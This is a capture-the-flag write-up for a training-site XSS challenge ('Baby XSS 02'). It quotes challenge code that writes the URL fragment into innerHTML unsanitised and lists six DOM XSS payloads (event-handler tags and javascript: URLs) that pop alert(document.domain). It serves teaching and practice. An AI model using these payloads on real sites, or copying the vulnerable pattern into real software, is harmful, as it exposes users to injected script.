---
layout: default
title: XSS Challenge by y0n3uchy Baby XSS 02
set: For Newbies
order: 2
---

# [Baby XSS 02](https://xss.challenge.training.hacq.me/challenges/baby02.php)

Just like other challenges on this website, the page's backend source is visible:

```
<script src="hook.js"></script>
<script>
    window.addEventListener("load", function() {
        var q = location.hash.substring(1);
        window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
    });
</script>

<p id="query"></p>

<h1>inject</h1>
<p>Inspect the source code carefully and find where to inject :-)</p>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

Also, there's no `<input>` tag and the game tells us "Inspect the source code carefully and find where to inject :-)".

This code stands out:

```
window.addEventListener("load", function() {
    var q = location.hash.substring(1);
    window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
});
```

This tells us that the server will append to 'Hello! ' anything we put after a `#` in the URL. An example of this could be:

`https://xss.challenge.training.hacq.me/challenges/baby02.php#<script>alert(document.domain)</script>`

However, this will not work as `<script>` tags will be [parsed but not executed](https://w3c.github.io/DOM-Parsing/#dom-innerhtml). We have to find a different way. All these payloads, that avoid using the `<script>` tag, will work:

>`#<img src=x onerror=alert(document.domain)>`

>`#<body onload=alert(document.domain)>`

>`#<svg onload=alert(document.domain)>`

>`#<input onfocus=alert(document.domain) autofocus>`

>`#<iframe src="javascript:alert(document.domain)">`

>`#<object data="javascript:alert(document.domain)">`